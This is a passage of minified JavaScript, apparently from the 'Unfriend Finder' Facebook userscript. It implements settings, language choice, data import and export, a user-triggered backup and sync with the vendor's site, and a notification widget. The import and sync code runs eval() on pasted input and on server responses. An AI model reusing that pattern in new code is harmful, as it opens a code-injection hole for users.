}else{if(tour.length>1){CSS3.addClass(object,"uiStepSelected");CSS3.addClass(getFromId("uiStep"+(tour.length-1)),"uiStepNextSelected")}}}if(typeof step.handler=="function"){EventMgr.addListener(getFromId("tour_step_"+step.id+""),EventMgr.EVENTS.click,function(){tour.showStep(step.id)})}if(tour.length==1){CSS3.addClass(object,"uiStepFirst")}if(tour.length==tour.steps.elements.length){CSS3.addClass(object,"uiStepLast")}};tour.toString=function toString(){return"[object Tour]"};tour.build();return tour
};var Settings=function Settings(){var sets=this;sets.user_id=core.user_id;sets.content="";sets.bindLangs=function(){var langs=(new xPathSelector("//input")).getMultipleNodeValues(),input;while(input=langs.iterateNext()){if((input.type=="radio")&&(input.name=="lang")){EventMgr.addListener(input,EventMgr.EVENTS.click,function(){sets.setLang()})}}};sets.appendMenu=function(){if(getFromId("fb_menu_settings_dropdown")){Console.log("Adding settings menu");new xHTMLElement({element:"div",className:"fb_menu_item",innerHTMl:'<a id="ufSettings2_menu" href="'+Params.protocol+"//"+Params.host+'/?sk=ufs" onclick="return false;" class="fb_menu_item_link"><small style="background-image:url('+Params.icons.unfriends+');"> </small>'+Params._0x4d22+"</a>",parentNode:getFromId("fb_menu_settings_dropdown")});
EventMgr.addListener(getFromId("ufSettings2_menu"),EventMgr.EVENTS.click,function(){if(getFromId("UFfilterTextSettings")){core.filter.select("settings")}else{core.href(Params.protocol+"//"+Params.host+"/?sk=ufs")}inject(function(){Toggler.toggle($("navAccount"))})})}};sets.setOptions=function(n){CSS3.display(getFromId("loadingIndicatorSettings"),CSS3.DISPLAY.inlineBlock);var checks=(new xPathSelector("//input")).getMultipleNodeValues(),children=new (Array),input;while(input=checks.iterateNext()){if((input.type=="checkbox")&&(/^Params\.settings\.[a-zA-Z]+$/.test(input.name))){Params.settings[input.id]=(input.checked?true:false)
}}saveSettings();if(n.name=="Params.settings.hideInMenubar"){core.menubar.build()}else{if(n.name=="Params.settings.hideNub"){if(n.checked){CSS3.hide(getFromId("UFNubToggler").parentNode);CSS3.removeClass(Params.body,"showNub")}else{CSS3.display(getFromId("UFNubToggler").parentNode,CSS3.DISPLAY.inlineBlock);CSS3.addClass(Params.body,"showNub")}}else{if(n.name=="Params.settings.webkitNotifications"){try{window.webkitNotifications.requestPermission()}catch(exception){new ErrorHandler(exception,"window.webkitNotifications.requestPermission()")
}}else{if(n.name=="Params.settings.debug"){Params.debug=Params.settings.debug;Console.log("Debug "+(Params.debug?"Activated":"Deactivated"))}}}}core.filter.setValue({unfriends:{counter:{value:core.getCounter()}}});try{new xHTMLNotification({type:"setting",name:"",picture:"",action:"Changed <strong>"+n.name+"</strong> ("+n.title+") to <strong>"+(n.checked?"true":"false")+"</strong>.",date:genTime(core.time())});core.sendBeeper({type:"setting",text:"Changed <strong>"+n.name+"</strong> ("+n.title+") to <strong>"+(n.checked?"true":"false")+"</strong>.",id:n.id,status:null})
}catch(exception){new ErrorHandler(exception,"sets.setOptions.sendBeeper()")}setTimeout(function(){CSS3.hide(getFromId("loadingIndicatorSettings"))},1000)};sets.setLang=function(){var langs=(new xPathSelector("//input")).getMultipleNodeValues(),input,lang;while(input=langs.iterateNext()){if((input.type=="radio")&&(input.name=="lang")&&(input.checked)){lang=input.id;break}}getFromId(lang).parentNode.innerHTML='<img src="'+Params.images.smallIndicator+'" style="height: 11px; margin-top: 5px;" />';setTimeout(function(){Registry.setKey("language",(lang?lang:"en_US"));
core.href(Params.protocol+"//"+Params.host+"/")},1000)};sets.setLangs=function(json){var lang;for(lang in json.langs){if(json.langs.hasOwnProperty(lang)){lang=json.langs[lang];sets.addLangOnSettings(lang)}}sets.addLangOnSettings({name:"Automatic : ",id:"lang_auto",icon:"auto"});sets.bindLangs()};sets.addLangOnSettings=function(lang){var tr=new xHTMLElement({element:"tr",style:{background:"white"},parentNode:getFromId("langs_tbody")}).getElement();new xHTMLElement({element:"td",className:"action_text",style:{borderBottom:"1px solid #E2E6EF",margin:"0",padding:"3px",paddingLeft:"10px"},innerHTML:Switch(lang.id,{lang_auto:"<span>"+lang.name+'&nbsp;<img src="https://www.unfriendfinder.com/images/'+(core.fb_locale)+'.flag" alt="'+core.fb_locale+'" /></span>',"default":"<span style=\"background: url('https://www.unfriendfinder.com/images/"+(lang.icon?lang.icon:lang.id)+".flag') no-repeat 1px 1px; padding-left:26px;\">"+lang.name+"</span>"}),parentNode:tr});
new xHTMLElement({element:"td",className:"even_column",style:{borderBottom:"1px solid #E2E6EF",margin:"0",padding:"3px",textAlign:"center"},innerHTML:'<input type="radio" value="'+lang.id+'" name="lang" id="'+lang.id+'"'+(LANG==lang.id?' checked="checked"':"")+" />",parentNode:tr})};sets.bindSettings=function(){sets.bindLangs();var checks=(new xPathSelector("//input")).getMultipleNodeValues(),input,date,children=new (Array);while(input=checks.iterateNext()){if((input.type=="checkbox")&&(/Params\.settings\.[a-z]+/.test(input.name))){EventMgr.addListener(input,EventMgr.EVENTS.change,function(e){sets.setOptions(e.target)
})}}EventMgr.addListener(getFromId("test_webkitNotifications"),EventMgr.EVENTS.click,function(){if(window.webkitNotifications){if(window.webkitNotifications.checkPermission()==0){var popup=window.webkitNotifications.createNotification("","Notification test","This is a webkit Notification");popup.show();setTimeout(function(){popup.cancel()},5000);return true}}else{core.lEF("Error","webKit Notifications are not available on your browser.")}});EventMgr.addListener(getFromId("paging"),EventMgr.EVENTS.click,function(){Params.settings.paging=(getFromId("paging").checked?Params.defaultSettings.paging:0);
if(Params.settings.paging==0){CSS3.hide(getFromId("trPagingCount"))}else{CSS3.display(getFromId("trPagingCount"),CSS3.DISPLAY.tableRow)}CSS3.display(getFromId("loadingIndicatorSettings"),CSS3.DISPLAY.inlineBlock);saveSettings();core.Beeper.Add({type:"setting",text:"Changed <strong>Params.settings.paging</strong> to <strong>"+getFromId("paging").checked+"</strong>.",id:"paging",status:null});setTimeout(function(){CSS3.hide(getFromId("loadingIndicatorSettings"))},1000)});EventMgr.addListener(getFromId("pagingCount"),EventMgr.EVENTS.change,function(){Params.settings.paging=getFromId("pagingCount").value;
CSS3.display(getFromId("loadingIndicatorSettings"),CSS3.DISPLAY.inlineBlock);saveSettings();core.Beeper.Add({type:"setting",text:"Changed <strong>Params.settings.paging.value</strong> to <strong>"+getFromId("pagingCount").value+"</strong>.",id:"pagingCount",status:null});setTimeout(function(){CSS3.hide(getFromId("loadingIndicatorSettings"))},1000)});EventMgr.addListener(getFromId("paging_help"),EventMgr.EVENTS.click,function(){if(core.dialogs.pagingHelp){core.dialogs.pagingHelp.Hide()}else{Strings.pagingHelpEN="Enabling paging will help you to keep your list organized.\nFor people having friendlist with a lot of connections, it will help you to decrease the time of loading.\n<br />It's recommended to enable paging.";
Strings.pagingHelpFR="Activer la pagination va vous aider à maintenir vos listes organisées.\nPour les personnes qui ont un grand nombre d'unfriends, cela va vous aider à diminuer le temps de chargement.\n<br />Il est hautement recommandé d'utiliser la pagination.";if(!core.dialogs.pagingHelp){core.dialogs.pagingHelp=new ContextualDialog({id:"pagingHelp",title:'<span class="en_US">Paging</span><span class="fr_FR">Pagination</span>',body:'<span class="en_US">'+nl2br(Strings.pagingHelpEN)+'</span><span class ="fr_FR">'+nl2br(Strings.pagingHelpFR)+"</span>",context:getFromId("paging_help"),arrow:"left",align:"middle",buttons:{close:true}})
}core.dialogs.pagingHelp.Show()}});EventMgr.addListener(getFromId("newManagementLists_help"),EventMgr.EVENTS.click,function(){if(core.dialogs.newManagementLists){core.dialogs.newManagementLists.Hide()}else{Strings.pagingHelpEN="Enabling paging will help you to keep your list organized.\nFor people having friendlist with a lot of connections, it will help you to decrease the time of loading.\n<br />It's recommended to enable paging.";Strings.pagingHelpFR="Activer la pagination va vous aider à maintenir vos listes organisées.\nPour les personnes qui ont un grand nombre d'unfriends, cela va vous aider à diminuer le temps de chargement.\n<br />Il est hautement recommandé d'utiliser la pagination.";
if(!core.dialogs.newManagementLists){core.dialogs.newManagementLists=new ContextualDialog({id:"newManagementLists",title:'<span class="en_US">New Lists</span><span class="fr_FR">Nouvelles Listes</span>',body:'<span class="en_US">Use this setting if you want to use the new requests manager.<br />It can be useful if Facebook has rolled out the new lists to your account.</span><span class ="fr_FR">Cochez ce paramètre si vous voulez utiliser le nouveau système de gestion de connexions.<br />Il peut être utile si Facebook a mis à jour les nouvelles listes sur votre compte.</span>',context:getFromId("newManagementLists_help"),arrow:"right",align:"middle",buttons:{close:true}})
}core.dialogs.newManagementLists.Show()}});EventMgr.addListener(getFromId("resetButton"),EventMgr.EVENTS.click,function(){core.showResetDialog()});EventMgr.addListener(getFromId("exportButton"),EventMgr.EVENTS.click,function(){core.dialogs.exportFacebox=new Facebox({id:"exportFacebox",error:false,title:LANG.dataToExport,hint:LANG.exportHint,body:parseTemplate("<textarea id=\"exportArea\">({_toNotify        : ::tonotify::, _unfriends        : ::unfriends::, _friends          : ::friends::, _alwaysHide       : ::alwayshide::, _awaitingsIgnored : ::awaitingsignored::, _keepAwaitingList : ::keepawaitinglist::, _reappeared       : ::reappeared::, _deactivated      : ::deactivated::, _messages         : ::messages::, _helps            : ::helps::, _hasIgnored       : ::hasignored::, _wasUnfriend      : ::wasunfriend::, _countUnfriends   : ::countunfriends::, settings          : ::settings::, language          : '::language::', version           : '::version::', coreStarted       : '::coreStarted::'})</textarea>",{params:{tonotify:Registry.getKey(core.user_id+"_toNotify"),unfriends:Registry.getKey(core.user_id+"_unfriends"),friends:Registry.getKey(core.user_id+"_friends"),alwayshide:Registry.getKey(core.user_id+"_alwaysHide"),awaitingsignored:Registry.getKey(core.user_id+"_awaitingsIgnored"),keepawaitinglist:Registry.getKey(core.user_id+"_keepAwaitingList"),reappeared:Registry.getKey(core.user_id+"_reappeared"),deactivated:Registry.getKey(core.user_id+"_deactivated"),messages:Registry.getKey(core.user_id+"_messages"),helps:Registry.getKey(core.user_id+"_helps"),hasignored:Registry.getKey(core.user_id+"_hasIgnored"),wasunfriend:Registry.getKey(core.user_id+"_wasUnfriend"),countunfriends:Registry.getKey(core.user_id+"_countUnfriends"),settings:Registry.getKey("settings"),language:Registry.getKey("language"),version:Registry.getKey("version"),coreStarted:Registry.getKey("coreStarted")}}),loading:true,timeout:1500,afterLoad:function(){getFromId("exportArea").focus();
getFromId("exportArea").select()},indicator:true,buttons:[{name:"cancel",value:LANG.btn_close,id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]});core.dialogs.exportFacebox.Show()});EventMgr.addListener(getFromId("importButton"),EventMgr.EVENTS.click,function(){core.dialogs.importFacebox=new Facebox({id:"importFacebox",title:LANG.importData,body:'<textarea id="importArea" style="width:98%; height:300px;"></textarea>',error:false,loading:true,timeout:300,hint:LANG.importHint,afterLoad:function(){getFromId("importArea").focus()
},buttons:[{name:"import",value:LANG.text_import,id:"import_button",handler:function(){try{var imported;if(getFromId("importArea").value==""){return}try{imported=eval(getFromId("importArea").value)}catch(ex){try{imported=eval("("+getFromId("importArea").value+")")}catch(exception){alert("Error while importing data. Check the input data.");new ErrorHandler(exception,"import()");return}}Registry.setKey(core.user_id+"_toNotify",stringify(imported._toNotify));Registry.setKey(core.user_id+"_unfriends",stringify(imported._unfriends));
Registry.setKey(core.user_id+"_friends",stringify(imported._friends));Registry.setKey(core.user_id+"_alwaysHide",stringify(imported._alwaysHide));Registry.setKey(core.user_id+"_awaitingsIgnored",stringify(imported._awaitingsIgnored));Registry.setKey(core.user_id+"_keepAwaitingList",stringify(imported._keepAwaitingList));Registry.setKey(core.user_id+"_reappeared",stringify(imported._reappeared));Registry.setKey(core.user_id+"_deactivated",stringify(imported._deactivated));Registry.setKey(core.user_id+"_hasIgnored",stringify(imported._hasIgnored));
Registry.setKey(core.user_id+"_wasUnfriend",stringify(imported._wasUnfriend));Registry.setKey(core.user_id+"_countUnfriends",stringify(imported._countUnfriends));Registry.setKey(core.user_id+"_messages",stringify(imported._messages));Registry.setKey(core.user_id+"_helps",stringify(imported._helps));Registry.setKey("settings",stringify(imported.settings));Registry.setKey("language",imported.language);Registry.setKey("version",imported.version);Registry.setKey("coreStarted",1)}catch(exception){alert("Error while importing data. Check the input data.");
new ErrorHandler(exception,"import()");return}core.href("/")},disabled:false,closer:false,type:"blue"},{name:"cancel",value:LANG.btn_close,id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]});core.dialogs.importFacebox.Show()});EventMgr.addListener(getFromId("selectAll"),EventMgr.EVENTS.click,function(){var checks=(new xPathSelector("//input[@bindpoint='reset']")).getMultipleNodeValues(),input;while(input=checks.iterateNext()){if((input.type=="checkbox")&&(/reset_/.test(input.id))){input.checked=true
}}});EventMgr.addListener(getFromId("selectNone"),EventMgr.EVENTS.click,function(){var checks=(new xPathSelector("//input[@bindpoint='reset']")).getMultipleNodeValues(),input;while(input=checks.iterateNext()){if((input.type=="checkbox")&&(/reset_/.test(input.id))){input.checked=false}}});EventMgr.addListener(getFromId("external_login_button"),EventMgr.EVENTS.click,function(){var key=getFromId("external_connect_password").value;var id=getFromId("external_connect_userid").value;CSS3.display(getFromId("external_login_indicator"),CSS3.DISPLAY.inlineBlock);
CSS3.hide(getFromId("external_login_button"));Ajax({url:"https://www.unfriendfinder.com/backup/login.js",method:"post",data:"id="+escape(id)+"&key="+escape(key),onload:function(data){if(data=="{success: true}"){getFromId("external_connect_password").disabled=true;Registry.setKey(id+"_key",key);CSS3.hide(getFromId("external_login_button").parentNode);CSS3.display(getFromId("external_logout_button").parentNode,CSS3.DISPLAY.inlineBlock);CSS3.display(getFromId("external_sync_button").parentNode,CSS3.DISPLAY.inlineBlock);
CSS3.display(getFromId("external_backup_button").parentNode,CSS3.DISPLAY.inlineBlock)}else{core.lEF("Login Error","Wrong id/password")}CSS3.hide(getFromId("external_login_indicator"));CSS3.display(getFromId("external_login_button"),CSS3.DISPLAY.inlineBlock)}})});EventMgr.addListener(getFromId("external_sync_button"),EventMgr.EVENTS.click,function(){var key=getFromId("external_connect_password").value;var id=getFromId("external_connect_userid").value;CSS3.display(getFromId("external_login_indicator"),CSS3.DISPLAY.inlineBlock);
CSS3.hide(getFromId("external_login_button"));Ajax({url:"https://www.unfriendfinder.com/backup/sync.js",method:"post",data:"id="+escape(id)+"&key="+escape(key),onload:function(data){try{var imported;try{imported=eval(data)}catch(ex){try{imported=eval("("+data+")")}catch(exception){core.lEF("Error","Error while synchronizing data. Check the input data.");new ErrorHandler(exception,"import()");return}}if(imported._toNotify){Registry.setKey(core.user_id+"_toNotify",stringify(imported._toNotify))}if(imported._unfriends){Registry.setKey(core.user_id+"_unfriends",stringify(imported._unfriends))
}if(imported._friends){Registry.setKey(core.user_id+"_friends",stringify(imported._friends))}if(imported._awaitingsIgnored){Registry.setKey(core.user_id+"_awaitingsIgnored",stringify(imported._awaitingsIgnored))}if(imported._keepAwaitingList){Registry.setKey(core.user_id+"_keepAwaitingList",stringify(imported._keepAwaitingList))}if(imported._reappeared){Registry.setKey(core.user_id+"_reappeared",stringify(imported._reappeared))}if(imported._deactivated){Registry.setKey(core.user_id+"_deactivated",stringify(imported._deactivated))
}if(imported._hasIgnored){Registry.setKey(core.user_id+"_hasIgnored",stringify(imported._hasIgnored))}if(imported._wasUnfriend){Registry.setKey(core.user_id+"_wasUnfriend",stringify(imported._wasUnfriend))}if(imported.login){Registry.setKey(core.user_id+"_external_login_time",imported.login)}if(imported.login){date=new (Date)(imported.login);getFromId("external_lastlogin").innerHTML="Last sync: "+date.toDateString()+", "+date.toLocaleTimeString()}}catch(exception){core.lEF("Error","Error while importing data. Check the input data.");
new ErrorHandler(exception,"import()");return}core.lF("Synchronization","Sync complete");core.check(false)}})});EventMgr.addListener(getFromId("external_backup_button"),EventMgr.EVENTS.click,function(){CSS3.display(getFromId("external_login_indicator"),CSS3.DISPLAY.inlineBlock);CSS3.hide(getFromId("external_login_button"));var data={id:core.user_id,key:Registry.getKey(core.user_id+"_key",""),toNotify:Registry.getKey(core.user_id+"_toNotify"),unfriends:Registry.getKey(core.user_id+"_unfriends"),friends:Registry.getKey(core.user_id+"_friends"),awaitingsignored:Registry.getKey(core.user_id+"_awaitingsIgnored"),keepawaitinglist:Registry.getKey(core.user_id+"_keepAwaitingList"),reappeared:Registry.getKey(core.user_id+"_reappeared"),deactivated:Registry.getKey(core.user_id+"_deactivated"),hasignored:Registry.getKey(core.user_id+"_hasIgnored"),wasunfriend:Registry.getKey(core.user_id+"_wasUnfriend")};
var f=[];for(i in data){f.push(i+"="+escape(data[i]))}Ajax({url:"https://www.unfriendfinder.com/backup",method:"post",data:f.join("&"),onload:function(data){core.lF("Synchronization","Backup complete")}})});EventMgr.addListener(getFromId("external_logout_button"),EventMgr.EVENTS.click,function(){var id=getFromId("external_connect_userid").value;Registry.setKey(id+"_key","");getFromId("external_connect_password").disabled=false;CSS3.display(getFromId("external_login_button").parentNode,CSS3.DISPLAY.inlineBlock);
CSS3.hide(getFromId("external_logout_button").parentNode);CSS3.hide(getFromId("external_sync_button").parentNode);CSS3.hide(getFromId("external_backup_button").parentNode)});if(Registry.getKey(core.user_id+"_key","")==""){CSS3.display(getFromId("external_login_button").parentNode,CSS3.DISPLAY.inlineBlock);CSS3.hide(getFromId("external_logout_button").parentNode);CSS3.hide(getFromId("external_sync_button").parentNode);CSS3.hide(getFromId("external_backup_button").parentNode)}else{getFromId("external_connect_password").value=Registry.getKey(core.user_id+"_key","");
getFromId("external_connect_password").disabled=true;CSS3.hide(getFromId("external_login_button").parentNode);CSS3.display(getFromId("external_logout_button").parentNode,CSS3.DISPLAY.inlineBlock);CSS3.display(getFromId("external_sync_button").parentNode,CSS3.DISPLAY.inlineBlock);CSS3.display(getFromId("external_backup_button").parentNode,CSS3.DISPLAY.inlineBlock)}if(Registry.getKey(core.user_id+"_external_login_time",0)){date=new (Date)(Registry.getKey(core.user_id+"_external_login_time",+new (Date)));
getFromId("external_lastlogin").innerHTML="Last sync: "+date.toDateString()+", "+date.toLocaleTimeString()}};sets.toString=function toString(){return"[object Settings]"}};var NotificationIcon=function NotificationIcon(_type){if(_type=="unfriend"){if(!Params.Beeper.unfriend){return}return'<img src="'+Params.images.blank+'" class="UFBeep_Icon UIImageBlock_Image UIImageBlock_ICON_Image spritemap_icons sx_app_icons_unfriends" alt="" />'}else{if(_type=="deactivated"){if(!Params.Beeper.deactivated){return
}return'<img src="'+Params.images.blank+'" class="UFBeep_Icon UIImageBlock_Image UIImageBlock_ICON_Image spritemap_icons sx_app_icons_deactivated" alt="" />'}else{if(_type=="messages"){if(!Params.Beeper.messages){return}return'<img src="'+Params.images.blank+'" class="UFBeep_Icon UIImageBlock_Image UIImageBlock_ICON_Image sx_app_icons_message" alt="" />'}else{if(_type=="ignored"){if(!Params.Beeper.ignored){return}return'<img src="'+Params.images.blank+'" class="UFBeep_Icon UIImageBlock_Image UIImageBlock_ICON_Image spritemap_icons sx_app_icons_awaitings" alt="" />'
}else{if(_type=="version"){if(!Params.Beeper.newversion){return}return'<img src="'+Params.images.blank+'" class="UFBeep_Icon" style="background:no-repeat 0px -17px url(\''+Params.links.rsrc+'/v1/y1/r/jYgmaMxiCiD.png\');" alt="" />'}else{if(_type=="setting"){if(!Params.Beeper.settings){return}return'<img src="'+Params.images.blank+'" class="UFBeep_Icon spritemap_icons_fix" style="background-position: 0px -1182px; height:16px;" alt="" />'}else{if(_type=="reappeared"){if(!Params.Beeper.reappeared){return
}return'<img src="'+Params.images.blank+'" class="UFBeep_Icon UIImageBlock_Image UIImageBlock_ICON_Image spritemap_icons sx_app_icons_reappeared" alt="" />'}else{if(_type=="friend"){if(!Params.Beeper.newfriend){return}return'<img src="'+Params.images.blank+'" class="UFBeep_Icon UIImageBlock_Image UIImageBlock_ICON_Image spritemap_icons sx_app_icons_friend" alt="" />'}else{if(_type=="fish"){return'<img src="'+Params.images.blank+'" class="UFBeep_Icon" style="background:no-repeat 0px -204px url(\''+Params.links.rsrc+'/v1/yD/r/SwWkUVDRId0.png\');" alt="" />'
}}}}}}}}}};var xHTMLNotification=function xHTMLNotification(__constructor){if(!Params.settings.webkitNotifications){return}try{if(window.webkitNotifications.checkPermission()!=0){return}}catch(exception){return}var notification=this;Extend(notification,__constructor);notification.baseHTML='<?xml version="1.0" encoding="utf-8"?><!DOCTYPE html><html>    <head>        <link type="text/css" rel="stylesheet" href="::rsrc::/v1/yp/r/DSj7LgDtQ_D.css" />        <link type="text/css" rel="stylesheet" href="::rsrc::/v1/ym/r/fTpNCOdXw21.css" />        <link type="text/css" rel="stylesheet" href="::rsrc::/v1/yZ/r/BxxqRn1GrLw.css" />        <link type="text/css" rel="stylesheet" href="::rsrc::/v1/yw/r/T_hB40B4err.css" />        <link type="text/css" rel="stylesheet" href="::rsrc::/v1/yX/r/qHcwzj5OhFB.css" />        <style type="text/css">            a:hover { text-decoration: none; }            a { cursor: pointer; }            .top { height:32px; margin-left: 2px; }            .btm { height:23px; }            .blueName { color: #3B5998; }            img.UFBeep_Icon { margin-bottom: -5px; width: 16px; float:left; margin-right: 3px; }            .sx_app_icons_unfriends { background-image: url(\'::unfriends::\') !important; background-position: -16px 0px !important; width: 16px; height: 16px; display: inline-block; }\n            .sx_app_icons_awaitings { background-image: url(\'::awaitings::\') !important; background-position: -16px -0px !important; width: 16px; height: 16px; display: inline-block; }\n            .sx_app_icons_deactivated { background-image: url(\'::deactivated::\'); margin-top: -1px; width: 16px; height: 16px; display: inline-block; }\n            .sx_app_icons_ignored { background-image: url(\'::rsrc::/z2B5S/hash/696ouey0.png\') !important; background-position: 0 -1763px; height: 12px; margin: 2px 0px 0px 2px; width: 16px; display: inline-block; }\n            .sx_app_icons_reappeared { background-image: url(\'::rsrc::/z2B5S/hash/696ouey0.png\') !important; background-position: 0 -187px; height: 16px; margin-top: -2px; width: 16px; display: inline-block; }\n            .sx_app_icons_friend { background-image: url(\'::rsrc::/v1/yx/r/zGa_R4SG5mm.png\') !important; background-position: -134px -118px; height: 16px; width: 16px; display: inline-block; }\n            .sx_app_icons_settings { background-image: url(\'::rsrc::/z2B5S/hash/696ouey0.png\') !important; background-position: 0 -1182px; height: 16px; width: 16px; display: inline-block; }\n            .sx_app_icons_message { background-position: -17px -183px; background-image: url(\'::rsrc::/zS/r/SoE4jDlkVx3.png\'); background-repeat: no-repeat; display: inline-block; height: 16px; width: 16px; }\n            .white_box { background: white; }\n            .spritemap_icons_fix { background-image: url(\'::rsrc::/z2B5S/hash/696ouey0.png\') !important;        </style>    </head>    <body style="margin:5px; text-decoration: none;">        <ul class="jewelItemList">            <li class="notification">                <a href="#" target="_blank" style="position: relative">                    <div class="UIImageBlock clearfix">                        <img class="UIImageBlock_Image img" src="::picture::" alt="">                        <div class="info UIImageBlock_Content UIImageBlock_ICON_Content">                            <div class="top fcg">                                <span class="blueName">::name::</span> ::action::.                            </div>                            <div class="btm">                                ::icon::<span class="fcg" style="line-height:20px;">::date::</span>                            </div>                        </div>                    </div>                </a>            </li>        </ul>    </body></html>';
var _notification=parseTemplate(""+notification.baseHTML+"",{params:Extend({rsrc:Params.links.rsrc,icon:NotificationIcon(notification.icon?notification.icon:notification.type),blank:Params.images.blank,awaitings:Params.icons.awaitings,unfriends:Params.icons.unfriends,nopicture:Params.images.noPicture,deactivated:Params.icons.deactivated,},notification)});_notification="data:text/html;charset=utf-8,"+encodeURIComponent(_notification);notification.popup=window.webkitNotifications.createHTMLNotification(_notification);
notification.popup.onclick=function xHTMLNotificationClic(){if(typeof notification.callback){notification.callback.call([notification])}notification.popup.cancel();notification.popup=null};setTimeout(function(){notification.popup.cancel()},7000);notification.popup.show();return{toString:function toString(){return"[object xHTMLNotification]"}}};var Beeper=function Beeper(){var _beeper=this;_beeper.beeperBox;_beeper.arrow;_beeper.autoFade=true;_beeper.fadeTimeout;_beeper.length=0;_beeper.style=new (Style);
_beeper.style.Append(parseTemplate(".UFBeeper .UFBeeper_Full { background-color: #e1e6ee; border: 1px solid #99a8c7; -webkit-border-radius: 3px; -moz-border-radius: 3px; }\n.UFBeeper_Arrow { display: none; background: url('::rsrc::/z2US7/hash/ds6fwf8m.png') repeat scroll -210px -115px; height: 6px; position: absolute; bottom: -5px; left: 25px; width: 9px; margin-right: -1px; }\n.UFBeeper_Arrow_Selected { display: none; background: url('::rsrc::/z2US7/hash/ds6fwf8m.png') repeat scroll -210px -104px; height: 6px; position: absolute; bottom: -5px; left: 25px; width: 9px; margin-right: -1px; }\n.sidebarMode .UFBeeper_Arrow_Selected { left: 100%; margin-left: -19px; display: none; }\n.sidebarMode .UFBeeper_Arrow { left: 100%; margin-left: -19px; display: none; }\nbody.showNub .UFBeeper_Arrow_Selected { display: block !important; }\nbody.showNub .UFBeeper_Arrow { display: block !important; }\n.UFBeeper .UFBeep { overflow: hidden; padding: 10px 5px; border-bottom: 1px solid #99A8C7; }\n.UFBeeper .UFBeep_Bottom { border-bottom: none; }\n.UFBeeper .UFBeep:hover { background-color: #cad1de; }\n.UFBeeper .UFBeeper_Hide_Link { visibility: hidden; float: right; margin-bottom: -4px; }\n.UFBeep div.UFBeep_Icon { width: 20px; display: inline-block; }\n.UFBeep img.UFBeep_Icon { margin-bottom: -5px; width: 16px; }\n.UFBeep .UFBeep_Title { width: 180px; display: table-cell; line-height: 16px; cursor:default; max-width: 180px; }\n.UFBeep .UFBeep_NonIntentional { display: table; cursor: default; width: 100%; }\n"+(Params.settings.hideNub?"#UFBeeper_Arrow { display: none; }\n":"")+"#BeeperBoxUF { max-width: 229px; min-width: 229px; position: absolute; bottom: 35px; right: 0px; margin-right: -1px; }\n.UFBeep_Selected .uiHideNotification { visibility:visible !important; }\n.explanation_note { background: none repeat scroll 0 0 #FFF8CC; border: 1px solid #FFE222; padding: 8px; }\n",{params:{rsrc:Params.links.rsrc}}));
_beeper.mouseover=false;_beeper.fadeIn=function beeperFadeIn(){trace();if(_beeper.beeperBox.style.opacity>=1){_beeper.mouseover=false;return}_beeper.beeperBox.style.opacity=parseFloat(_beeper.beeperBox.style.opacity)+0.01;_beeper.arrow.style.opacity=parseFloat(_beeper.beeperBox.style.opacity)+0.01;setTimeout(_beeper.fadeIn,30);_beeper.mouseover=true};_beeper.fadeOut=function beeperFadeOut(){trace();if(_beeper.mouseover){_beeper.beeperBox.style.opacity=1;_beeper.arrow.style.opacity=1}else{if(_beeper.beeperBox.style.opacity<=parseFloat(0.05)){_beeper.beeperBox.innerHTML=template.BeeperBox();
_beeper.length=0;return}_beeper.beeperBox.style.opacity=parseFloat(_beeper.beeperBox.style.opacity)-0.01;_beeper.arrow.style.opacity=parseFloat(_beeper.beeperBox.style.opacity)-0.01;_beeper.fadeTimeout=setTimeout(_beeper.fadeOut,20)}};_beeper.Hide=function beeperHide(){trace();_beeper.beeperBox.style.opacity=0;_beeper.arrow.style.opacity=0;_beeper.beeperBox.innerHTML=template.BeeperBox();_beeper.length=0;_beeper.mouseover=false};_beeper.Build=function beeperBuild(){trace();var fbDockChat;if(fbDockChat=getFromId("fbDockChat")){_beeper.beeperBox=new xHTMLElement({element:"div",id:"BeeperBoxUF",className:"UFBeeper UFBeeper_Active",style:{opacity:0,zIndex:110},innerHTML:template.BeeperBox(),parentNode:getFromId("fbDockChatBuddylistNub").parentNode,before:getFromId("fbDockChatBuddylistNub"),listeners:{mouseover:function(){if(_beeper.length>0){_beeper.autoFade=false;
_beeper.mouseover=true;_beeper.beeperBox.style.opacity=1;_beeper.arrow.style.opacity=1;if(_beeper.fadeTimeout){clearTimeout(_beeper.fadeTimeout)}}},mouseout:function(){if(_beeper.length>0){_beeper.autoFade=false;_beeper.mouseover=false;if(_beeper.fadeTimeout){clearTimeout(_beeper.fadeTimeout)}_beeper.fadeTimeout=setTimeout(_beeper.fadeOut,3000)}}}}).getElement();_beeper.arrow=getFromId("UFBeeper_Arrow")}};_beeper.Add=function beeperAdd(__constructor){trace();if(!Params.Beeper.enabled){return}if(getFromId("UFBeeper_"+__constructor.type+"_"+__constructor.id)){getFromId("UFBeeper_"+__constructor.type+"_"+__constructor.id).innerHTML=__constructor.text;
_beeper.Show()}else{Console.log("Adding "+__constructor.type+" beep, id:"+__constructor.id);_beeper.message=__constructor.text;var icon=NotificationIcon(__constructor.icon?__constructor.icon:(__constructor.type=="unfriend"?(__constructor.status=="deactivated"?"deactivated":"unfriend"):__constructor.type));if(!icon){return}_beeper.icon=icon;_beeper.length++;var children=_beeper.getBeeperChildren(_beeper.beeperBox),n,i;_beeper.beepsBox=_beeper.beeperBox.getElementsByClassName("Beeps")[0];if(!children){n=0
}else{n=children.length}new xHTMLElement({element:"div",innerHTML:parseTemplate('    <div class="UFBeep_NonIntentional status_::status::">        <div class="UFBeep_Icon">::icon::</div>        <div class="UFBeep_Title" id="UFBeeper_::type::_::id::">::message::</div>        <a href="#" onclick="return false;" id="hide_notification_::id::" class="uiHideNotification UFBeeper_Hide_Link uiSelectorButton uiCloseButton uiCloseButton uiCloseButton" title="::remove::"></a>    </div>',{params:{status:__constructor.status,icon:_beeper.icon,type:__constructor.type,id:__constructor.id,message:_beeper.message,remove:LANG.hide}}),parentNode:_beeper.beepsBox});
try{children=_beeper.getBeeperChildren(_beeper.beepsBox);n=children.length;for(i=0;i<n;i++){CSS3.setClass(children[i],"UFBeep");if(i==0){CSS3.addClass(children[i],"UFBeep_Top")}if(i==(n-1)){CSS3.addClass(children[i],"UFBeep_Bottom")}}_beeper.beeperMouseEvents()}catch(exception){new ErrorHandler(exception,"_beeper.getBeeperChildren()")}EventMgr.addListener(getFromId("hide_notification_"+__constructor.id),EventMgr.EVENTS.click,function(){setTimeout(function(){_beeper.closing=false;getFromId("UFBeeper_Arrow").style.opacity=0;
